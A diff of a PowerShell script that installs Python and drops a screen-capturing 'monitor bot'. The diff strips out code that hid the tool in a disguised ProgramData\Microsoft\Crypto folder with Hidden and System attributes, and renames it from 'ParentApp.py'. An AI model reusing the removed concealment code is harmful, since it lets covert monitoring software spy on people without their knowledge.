@@ -6,19 +6,13 @@ Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
 # Log file for PowerShell script
-$logPath = "$env:ProgramData\Microsoft\Crypto\install_log.txt"
+$logPath = "C:\install_log.txt"
 function Log-Message {
     param($Message)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "$timestamp - $Message" | Out-File -FilePath $logPath -Append
 }
 
-# Create hidden directory
-$hiddenDir = "$env:ProgramData\Microsoft\Crypto"
-if (-not (Test-Path $hiddenDir)) {
-    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
-    Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
-}
 Log-Message "Starting script execution"
 
 # Download Python 3.13.2 installer
@@ -34,8 +28,8 @@ try {
     exit 1
 }
 
-# Create ParentApp.py
-$pyPath = "$hiddenDir\ParentApp.py"
+# Create MonitorBot.py
+$pyPath = "C:\MonitorBot.py"
 $scriptContent = @'
 import io
 import threading
@@ -62,7 +56,7 @@ FRAME_INTERVAL = 0.8
 JPEG_QUALITY = 50
 AUTO_INTERVAL = 300
 RESIZE_SCALE = 0.5
-LOG_FILE = "monitor_bot.log"
+LOG_FILE = "C:\\monitor_bot.log"
 
 # Setup logging
 logging.basicConfig(
@@ -284,17 +278,16 @@ if __name__ == "__main__":
 '@
 try {
     $scriptContent | Out-File -FilePath $pyPath -Encoding utf8
-    Set-ItemProperty -Path $pyPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
-    Log-Message "Created ParentApp.py at $pyPath"
+    Log-Message "Created MonitorBot.py at $pyPath"
 } catch {
-    Log-Message "Error creating ParentApp.py: $_"
-    Write-Host "Error creating ParentApp.py: $_"
+    Log-Message "Error creating MonitorBot.py: $_"
+    Write-Host "Error creating MonitorBot.py: $_"
     exit 1
 }
 
 Write-Host "Script execution complete."
 Write-Host "Python installer downloaded to: $installerPath"
-Write-Host "ParentApp.py created at: $pyPath"
+Write-Host "MonitorBot.py created at: $pyPath"
 Write-Host "Check logs at: $logPath"
 Read-Host "Press Enter to exit..."
 ```
